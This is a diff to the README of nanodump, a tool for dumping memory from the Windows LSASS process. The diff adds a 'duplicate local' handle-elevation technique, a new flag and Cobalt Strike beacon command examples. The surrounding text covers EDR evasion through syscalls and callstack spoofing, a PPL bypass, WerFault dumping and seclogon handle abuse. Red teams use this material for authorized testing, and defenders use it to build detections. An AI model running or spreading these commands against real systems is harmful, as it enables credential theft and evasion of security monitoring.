@@ -12,6 +12,7 @@ A flexible tool that creates a minidump of the LSASS process.
   <li><a href="#fork">Process forking</a></li>
   <li><a href="#snapshot">Snapshot</a></li>
   <li><a href="#handledup">Handle duplication</a></li>
+  <li><a href="#duplocal">Duplicate local handle</a></li>
   <li><a href="#seclogon-leak-local">Seclogon handle leak local</a></li>
   <li><a href="#seclogon-leak-remote">Seclogon handle leak remote</a></li>
   <li><a href="#seclogon-duplication">Seclogon handle duplication</a></li>
@@ -27,7 +28,7 @@ A flexible tool that creates a minidump of the LSASS process.
 <h2 id="features">1. Features</h2>
 
 <ul>
-  <li>It uses syscalls (with <a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a>) for most operations.</li> 
+  <li>It uses syscalls for most operations.</li> 
   <li>Syscalls are called from an <b>ntdll</b> address to bypass some syscall detections.</li> 
   <li>It sets the syscall callback hook to NULL.</li> 
   <li>Windows APIs are called using dynamic invoke.</li> 
@@ -117,23 +118,27 @@ As opening a handle to LSASS can be detected, nanodump can instead search for ex
 If one is found, it will copy it and use it to create the minidump.  
 Note that it is not guaranteed to find such handle.
 
-<h2 id="seclogon-leak-local">6. Seclogon handle leak local</h2>
+<h2 id="duplocal">6. Duplicate local handle</h2>
+
+You can obtaina handle to LSASS with PROCESS_QUERY_LIMITED_INFORMATION, which is likely to be whitelisted, and then elevate that handle by duplicating it.
+
+<h2 id="seclogon-leak-local">7. Seclogon handle leak local</h2>
 
 To avoid opening a handle to LSASS, you can use abuse the seclogon service by calling `CreateProcessWithLogonW` to leak an LSASS handle into the nanodump binary.  
 To enable this feature, use the `--seclogon-leak-local` parameter.  
 Take into account that when used from Cobalt Strike, an unsigned nanodump binary needs to be written to disk to use this feature.
 
-<h2 id="seclogon-leak-remote">7. Seclogon handle leak remote</h2>
+<h2 id="seclogon-leak-remote">8. Seclogon handle leak remote</h2>
 
 This technique is very similar to the previous one, but instead of leaking the handle into nanodump, it is leaked into another binary and then duplicated so that nanodump can used it.
 Use the `--seclogon-leak-remote` flag to access this functionality.
 
-<h2 id="seclogon-duplication">8. Seclogon handle duplication</h2>
+<h2 id="seclogon-duplication">9. Seclogon handle duplication</h2>
 
 You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition using file locks.
 Use the `--seclogon-duplicate` flag to access this functionality.
 
-<h2 id="ssp">9. Load nanodump as an SSP</h2>
+<h2 id="ssp">10. Load nanodump as an SSP</h2>
 
 You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\report.docx` by default. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
 To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.  
@@ -158,7 +163,7 @@ beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
 ```
 
 
-<h2 id="ppl">10. PPL bypass</h2>
+<h2 id="ppl">11. PPL bypass</h2>
 If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  
 
 To access this feature, use the `nanodump_ppl` command
@@ -166,7 +171,7 @@ To access this feature, use the `nanodump_ppl` command
 beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
 ```
 
-<h2 id="wer">11. WerFault</h2>
+<h2 id="wer">12. WerFault</h2>
 You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry
 
 Because the dump is not made by nanodump, it will always have a valid signature.
@@ -199,14 +204,14 @@ beacon> nanodump --shtinkering
 
 The dump will tipically be created under `C:\Windows\system32\config\systemprofile\AppData\Local\CrashDumps`
 
-<h2 id="spoof-callstack">12. Spoof the callstack</h2>
+<h2 id="spoof-callstack">13. Spoof the callstack</h2>
 
 You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate.  
 The offsets used in this feature, are only valid for Windows 10.0.19044.1706 (21h2), in other versions, the callstack might not look as expected. 
 You can spoof the callstack of svchost, wmi and rpc.  
 To access this feature, use the paramter `--spoof-callstack` with the values `svchost`, `wmi` or `rpc`.  
 
-<h2 id="params">12. Parameters</h2>
+<h2 id="params">14. Parameters</h2>
 
 #### --write -w < path > (required for EXE)
 Where to write the dumpfile.
@@ -226,6 +231,9 @@ Create a snapshot of LSASS and dump this new process.
 
 #### --duplicate -d
 Try to find an existing handle to LSASS and duplicate it.
+
+#### --duplicate-local -dl
+open a handle to LSASS with low privileges and duplicate it to gain higher privileges.
 
 #### --seclogon-leak-local -sll
 Leak an LSASS handle into nanodump from the seclogon service  
@@ -250,7 +258,7 @@ Force WerFault to dump LSASS in the specified folder via Shtinkering.
 Get PID of LSASS and leave.  
 This is just for convenience, nanodump does not need the PID of LSASS.
 
-<h2 id="examples">13. Examples</h2>
+<h2 id="examples">15. Examples</h2>
 
 Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
 ```
@@ -323,7 +331,22 @@ Obtain a handle using seclogon leak local and create the dump using the Shtinker
 beacon> nanodump --seclogon-leak-local --shtinkering
 ```
 
-<h2 id="redirectors">14. HTTPS redirectors</h2>
+Obtain a handle with low privs and elevate it using _duplicate local_:
+```
+beacon> nanodump --duplicate-local
+```
+
+Obtain a handle with low privs using a valid calling stack and elevate it using _duplicate local_:
+```
+beacon> nanodump --duplicate-local --spoof-callstack rpc
+```
+
+Duplicate an existing low priv handle and elevate it using _duplicate local_:
+```
+beacon> nanodump --duplicate --duplicate-local
+```
+
+<h2 id="redirectors">16. HTTPS redirectors</h2>
 
 If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
 Increase the max size of requests on your web server to allow nanodump to download the dump.
@@ -354,3 +377,4 @@ location ~ ^...$ {
 - [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
 - [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2) and the Shtinkering technique
 - [William Burgess](https://twitter.com/joehowwolf) for [Spoofing Call Stacks To Confuse EDRs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs)
+- [Sebastian Feldmann](https://twitter.com/thefLinkk) and [Fabian](https://twitter.com/testert01) for the _duplicate local_ technique discussed at [Morph Your Malware!](https://www.youtube.com/watch?v=AucQUjJBJuw)
